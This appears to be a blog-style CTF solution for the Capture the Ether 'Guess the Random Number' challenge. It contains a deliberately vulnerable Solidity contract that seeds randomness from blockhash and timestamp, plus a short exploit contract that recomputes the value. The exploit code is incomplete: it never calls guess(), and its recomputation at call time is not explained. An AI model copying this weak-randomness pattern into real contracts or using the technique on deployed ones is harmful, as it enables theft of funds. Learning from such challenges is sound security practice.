@@ -1,0 +1,73 @@
+---
+title: Capture the Ether (RareSkills Repo) - Guess the Random Number - Solution
+date: '2024-07-01'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Capture the Ether - Guess the Random Number CTF
+---
+
+# Capture the Ether (RareSkills Repo) - Guess the Random Number - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract GuessRandomNumber {
+    uint8 answer;
+
+    constructor() payable {
+        require(msg.value == 1 ether);
+        answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function guess(uint8 n) public payable {
+        require(msg.value == 1 ether);
+
+        if (n == answer) {
+            (bool ok, ) = msg.sender.call{value: 2 ether}("");
+            require(ok, "Fail to send to msg.sender");
+        }
+    }
+}
+```
+
+## Exploit
+
+Note that the "random" number is generated based on known block parameters such as the previous block's hash and the current block's timestamp.
+Therefore, we can simply replicate the "random" number by using the very same generation code in our exploit:
+
+```solidity
+contract ExploitContract {
+    GuessRandomNumber public guessRandomNumber;
+    uint8 public answer;
+
+    function Exploit() public returns (uint8) {
+        answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+        return answer;
+    }
+}
+```
